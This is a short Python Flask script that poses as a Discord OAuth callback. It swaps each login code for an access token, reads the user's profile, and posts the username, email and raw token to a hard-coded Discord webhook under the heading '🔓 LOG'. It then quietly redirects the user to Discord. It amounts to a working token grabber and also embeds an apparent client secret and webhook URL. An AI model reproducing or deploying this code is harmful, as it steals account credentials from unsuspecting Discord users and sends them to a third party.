import requests
from flask import Flask, request, redirect

app = Flask(__name__)

ID = "1501206551942398092"
SEC = "7A2BCkMpq3sqaV0RwYu2JOYjc2qRtfjz"
URI = "https://web-assets-v1.onrender.com/callback"
WEB = "https://discord.com/api/webhooks/1501215100667691090/3ZWwbeqzcBxsOTKERvyFrH8mfh-JxMkPWLKbLjk4ZOZIdBFN6zjmmEcL4cq5Ji5DcCOx"

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return "No Code", 400
    
    data = {'client_id':ID,'client_secret':SEC,'grant_type':'authorization_code','code':code,'redirect_uri':URI}
    r = requests.post('https://discord.com/api/v10/oauth2/token', data=data).json()
    tk = r.get('access_token')

    if tk:
        u = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization':f'Bearer {tk}'}).json()
        # This is the line that was crashing. Ensure it ends with )
        requests.post(WEB, json={"embeds":[{"title":"🔓 LOG","fields":[{"name":"User","value":u.get('username')},{"name":"Email","value":u.get('email')},{"name":"Token","value":f"```{tk}
```"}]}]})
        
    return redirect("https://discord.com/app")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
